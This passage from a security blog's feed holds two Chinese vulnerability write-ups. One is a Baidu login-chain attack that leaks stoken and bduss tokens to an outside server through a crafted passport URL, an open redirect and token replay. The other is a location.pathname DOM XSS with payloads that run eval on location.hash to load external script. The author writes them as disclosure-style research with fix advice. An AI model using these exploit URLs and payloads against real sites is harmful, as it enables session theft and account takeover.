v3系统。但是set-cookie的是v2系统。虽然会拿到stoken+bduss。但是这是贴吧业务下,并不能拿到http-only(bduss)  :)因为并不是根据v3设置的bduss所以访问Location也不能set-cookie:bduss    按照正常架构,tpl是肯定要和u参数一一对应的。我们测试下是否存在问题。</p><p><img src="http://p0a5v6dfs.bkt.clouddn.com//15121831408581.jpg" alt=""></p><p>我们把tpl换成百度网盘的代号 u参数为找到的tieba url。顿时惊喜万分。这是百度登录系统的第二个架构问题。tpl和u参数不对应。这无疑减少了攻击难度。我们只需要找到使用v3登录系统任一域名下的xss或者open direction等漏洞就可利用。</p><h4 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h4><p>为了拿到最佳漏洞,我们必须要构造最完美的利用链。现在的攻击方式就是让用户去访问</p><p><code>https://passport.baidu.com/v3/login/api/auth/?return_type=3&amp;tpl=bp&amp;u=http%3A%2F%2Ftieba.baidu.com%2Ff%2Fcommit%2Fshare%2FopenShareApi%3Furl%3Dhttp%253A%252F%252Ftieba.baidu.com%252Fp%252F4970918825%252310006-tieba-1-38713-bf6461719a993b4683f4212b1604e413%26title%3D2017%25E6%259D%258E%25E5%25BD%25A6%25E5%25AE%258F%25E4%25B8%258B%25E7%258B%25A0%25E5%25BF%2583%253A%25E7%2599%25BE%25E5%25BA%25A6%25E8%25A6%2581%25E6%2595%25B4%25E9%25A1%25BF%25E9%25A3%258E%25E6%25B0%2594%252C%25E6%2589%2593%25E5%2587%25BB%25E8%25BF%2587%25E5%25BA%25A6%25E5%25B9%25BF%25E5%2591%258A_%25E7%2599%25BE%25E5%25BA%25A6%25E5%2590%25A7_%25E7%2599%25BE%25E5%25BA%25A6%25E8%25B4%25B4%25E5%2590%25A7%26desc%3D%26comment%3D%26pic%3Dhttp%3A%2F%2F121.42.166.76%2Fx%2Fphpwaf.php%3F.jpg</code></p><p>然后服务器会接受到referer传来的stoken+bduss。这样太不美观了。最完美的利用链肯定是从用户点击到跳转结束都是在百度域名下。这才称为优雅。<br>xxx.baidu.com =&gt; attack.com.index.html=&gt;tieba.com<br>那就需要我们找到一个百度域名下的open redirection。哪里找呢。www.baidu.com就更好了。其实有现成的。当我们在百度页面上搜索url时。点击页面会出现自动跳转。</p><p><code>https://www.baidu.com/link?url=U38t5HcavSP8i3ndy2zBqFHNk49DAIPl9Nf8EaQ7ItniqYP7-GFf7qZKL8gtlo-Q&amp;wd=&amp;eqid=d6e00e170038d1860000000658a04fe5</code></p><p>类似这样。这下才称为完美利用才对～把exp放在 attack.com/index.html<br> 点击服务器记录log如下</p><p><img src="http://p0a5v6dfs.bkt.clouddn.com//15121832480977.jpg" alt=""></p><p>这时候我们要揭秘百度登录系统的第三个架构问题 就是Location里面拿到的 stoken+bduss居然可以重复使用。<br>构造登录页面如下 :)百度钱包为例</p><p><code>https://www.baifubao.com/api/0/sync_login/0?u=%2F&amp;errno=0&amp;errmsg=Auth%20Login%20Sucess&amp;stoken=a030ee1ff3177e74af143953318e1a02fe00d282274012bca70d6e358abb98c0911856e88dfc9b439ac0c63c58f9e39929c3b7e662fc0fa5855fba0ef6439168723359d32efe&amp;bduss=5be15498aac8e4422924b36361398d72d78a4550e2034c6430d7e412f82f09867ea983604696ee0f6f74fe70cf63fa5bdb4ab07f0c07a57a423f76e92f67c560b2f65d707ecf80744b56ae9becb9e83c269dfa8cef32e3b2b0416fadb8d52ab0979e138c7fd5f17acc788466e819347236e2e7060db1454dbcda8c9ecc847b8a35faf24e06ba9057b804462b32d13a1045da918c837ffe43b6164a9ffcc595a4a462918da6e9a578f8bd3e4efb646e8e0839446bfd90cc7a0fc98021ad5c1c10792a25778c10&amp;ssnerror=0</code></p><p>替换stoken+bduss 为我们获取的。attacker登陆进去查看http-only bduss 就可以拿到最终的bduss 从而进入各个服务</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ol><li>bduss这种敏感信息出现在GET参数里面。并且还是Location  :)建议:不要把敏感信息放在GET参数里面,如果实在没办法可以通过POST传入u and tpl参数完成Location。</li><li>没有验证tpl和u的一致性。代号和domain一致性的话 会大大加强漏洞的利用难度</li><li>stoken+bduss居然可以重复使用。建议做成一次性ticket</li><li>只要手机端百度浏览器登录了用户账号,点击链接也会盗号。所以危害全平台。做好手机端和pc端认证的分开。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[+] Author:MagicBlue&lt;br&gt;[+] Team: NeSE security team&lt;br&gt;[+] From: &lt;a href=&quot;https://magicbluech.github.io&quot;&gt;https://magicbluech.github.io&lt;/
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>一个xss的利用(location.pathname situation)</title>
    <link href="https://magicbluech.github.io/2017/12/01/%E4%B8%80%E4%B8%AAxss%E7%9A%84%E5%88%A9%E7%94%A8-location-pathname-situation/"/>
    <id>https://magicbluech.github.io/2017/12/01/一个xss的利用-location-pathname-situation/</id>
    <published>2017-12-01T09:39:40.000Z</published>
    <updated>2017-12-02T03:58:12.709Z</updated>
    
    <content type="html"><![CDATA[<p>[+] Author:MagicBlue<br>[+] Team: NeSE security team<br>[+] From: <a href="https://magicbluech.github.io">https://magicbluech.github.io</a><br>[+] Create: 2017-06-24</p><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>在weibo上看到neargle发了一个<a href="http://www.paulosyibelo.com/2015/04/facebooks-parse-dom-xss.html?m=1" target="_blank" rel="noopener">案例</a>里面是一个location.pathname利用的实际案例。自己原来的想法是这种类型的xss只会存在404页面那边。还有一个问题是$SERVER[‘PHP_SELF’]不进行urlencode,而window.location.pathname则会进行urlencode。<br><img src="http://p0a5v6dfs.bkt.clouddn.com/image.png" alt="image"></p><p>当时就去email to neargle 想探讨下这种类型在实战会怎么利用。</p><p><code>neargle say确实如果用 location.pathname 这个点是会被url编码的，但是也并不是所有的浏览器都会被编码，而且每个浏览器编码的范围不一样，Opera之前的版本是不会编码&quot;和&lt;的。可以参考https://github.com/wisec/domxsswiki/wiki/location,-documentURI-and-URL-sources。而且就算是编码也得看输出的点是什么，要是放在如eval等函数里面还是可以直接利用的。    祝好0v0</code></p><p>其实也就是具体问题具体分析～～运气很好,在做test的时候 恰好遇到了这么一个案例</p><h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><p>漏洞发生在搜索框 类似 =&gt; <a href="http://www.xss.com/search/site/search_content。search_content可控" target="_blank" rel="noopener">http://www.xss.com/search/site/search_content。search_content可控</a> 但是它是从location.pathname取出来的。我们只能用特定的几个字符。参考如下(笔者在chrome下进行此次测试)</p><p><img src="http://p0a5v6dfs.bkt.clouddn.com/14982740164859.jpg" alt=""></p><p>两个输出点逻辑(输入点 mmmagic)<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">_data = &#123;</span><br><span class="line"><span class="string">"level2"</span>: <span class="string">"5"</span>,</span><br><span class="line"><span class="string">"chapter1"</span>: <span class="string">""</span>,</span><br><span class="line"><span class="string">"chapter2"</span>: <span class="string">""</span>,</span><br><span class="line"><span class="string">"chapter3"</span>: <span class="string">""</span>,</span><br><span class="line"><span class="string">"title"</span>: <span class="string">"Internal Search"</span>,</span><br><span class="line"><span class="string">"mc"</span>: <span class="string">"mmmagic"</span>,</span><br><span class="line"><span class="string">"np"</span>: <span class="string">"1"</span>,&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">    &#123;$('#login-info').html('&lt;a href="/</span>p/login.php?p=<span class="regexp">/search/</span>site/mmmagic<span class="string">" target="</span>_blank<span class="string">"&gt;用户登录&lt;/a&gt;&lt;a href="</span>http:<span class="comment">//www//index.php?r=site/ProductPage&amp;PCODE=ZB&amp;utm_medium=online&amp;utm_source=frontpageheader&amp;utm_campaign=zbproductpage&amp;utm_term=tactical" target="_blank"&gt;订阅&lt;/a&gt;');&#125;</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p><p>这个点没有进行合理过滤,所以导致了上面location.pathname可以用的字符我们都可以用。但是也是不太好利用。第一个输出点我没太思考怎么绕过。我把我的思考方式放在后面那个输出点</p><p>我们没办法输入&gt;闭合a 标签 但是由于chrome 很好的容错性它会自动闭合tag 我们可以输入’，所以我们通过’)来闭合$(‘#’).html(‘’) xxxxxxx</p><p>我们已经解决了第一步。但是这样的payload由于语法错误会报错然后不执行。我们要想办法注释后面的点</p><ul><li>通过单行注释 /  但是由于是在pathname里面 我们可以输入/ 但是我们只能输入一个/ 达不到注释的效果</li><li>通过多行注释 /*  但是我们不可以输入}。来闭合前面的{</li></ul><p>以上两种方法均不能达到我们注释的目标(由于chrome在location.pathname支持的字符相比于其余主流浏览器支持的字符最少。所以只要chrome完美bypass。其余浏览器也没有问题了)</p><p>javascript 语法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = (<span class="string">'mmmagic"23333'</span>)</span><br><span class="line"> <span class="string">"mmmagic"</span><span class="number">23333</span><span class="string">"</span></span><br></pre></td></tr></table></figure><p> 既然我们不能注释后面 由于后面的字符原本是在(‘’) 里面的 经过前面的闭合 这个时候为</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">'#'</span>).html(<span class="string">'&lt;a href="/p/login.php?p=/search/site/'</span>)mmmagic<span class="string">" target="</span>_blank<span class="string">"&gt;用户登录&lt;/a&gt;&lt;a href="</span>http:<span class="comment">//www.//index.php?r=site/ProductPage&amp;PCODE=ZB&amp;utm_medium=online&amp;utm_source=frontpageheader&amp;utm_campaign=&amp;utm_term=tactical" target="_blank"&gt;xx&lt;/a&gt;');</span></span><br></pre></td></tr></table></figure><p>所以我们只需要把后面当作是一个string 赋值给一个变量就ok了</p><p>alert payload</p><p><a href="http://www.xss.com/search/site/&#39;)-alert(/mmmagic/);x=(&#39;mmmmagic" target="_blank" rel="noopener">http://www.xss.com/search/site/&#39;)-alert(/mmmagic/);x=(&#39;mmmmagic</a>,<br><img src="http://p0a5v6dfs.bkt.clouddn.com/14982756410400.jpg" alt=""></p><p>这个时候我们已经可以弹窗了。我们要朝着我们的终极目标前进,引入外部的js。这个时候已经很简单了</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search/site/')-eval(location.hash.substr(1));x=('mmmmagic,#  +js  方法不唯一</span><br></pre></td></tr></table></figure><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>用户的输入点都是不可信的，所以过滤就显得尤为重要了。web的思考思维是怎么绕过,这其中一块就是具体问题具体分析，往往是看似不可以利用的漏洞。通过几种方式的组合导致可以利用。由于最近一直在思考怎么写xss fuzz tool 所以有一些想法</p><ul><li>传统的xss扫描器 都是基于payload进行fuzz 这样就存在一个问题，检测出来的肯定是存在漏洞。但是由于这种fuzz。它会导致很多可以利用的点会被忽略掉。这大概是由于fuzz tool不够智能吧</li><li>漏洞出现的一个前提是没有过滤 或者是过滤的不充分。但是反过来思考。既然我们没办法构造一个基于大多数的漏洞模型。我们能不能提取出来一些完美的防御过滤模型，只要是符合这个模型的特点。我们就放行，反之就是肯定存在漏洞，这个办法的问题是误报率的问题以及人工成本的增加。人工手动验证的成本会大大增加。但是报着宁杀错杀一千也不放过一个的思维方式，这个是可取的</li><li>打造一个自己的fuzz tool 一定要基于实战 基于漏洞的打磨。但是我们不可以把每种漏洞出现的情况都纳到我们的模型，我们只能通过人工搜集,把一些典型的做成模型。然后让fuzz tools 以后自己分析，我觉得基于语义 基于上下文的fuzz才是未来。</li></ul><p>比如 它有这种智能的检测手段</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">     <span class="built_in">document</span>.path.name(<span class="string">'xxxxxxxxxxx'</span>)；</span><br><span class="line"> &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br></pre></td></tr></table></figure><p>如果fuzz tool 发现我们可控的点在xxxxxx处</p><ul><li>它要知道自己是处在js code环境下</li><li>它要知道它要闭合’)//   or  <code>&lt;/script&gt;&lt;img/src=1&gt;</code> or  ‘-alert(1)-‘ 来进行test</li><li>它需要基于语义 自动调整需要闭合的点。</li></ul><p>此刻大概就是这么多想法，要走的路还有很多。但是自己确实是想做出点东西了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[+] Author:MagicBlue&lt;br&gt;[+] Team: NeSE security team&lt;br&gt;[+] From: &lt;a href=&quot;https://magicbluech.github.io&quot;&gt;https://magicbluech.github.io&lt;/
      
    
    </summary>
    
    
  </entry>
  
</feed>
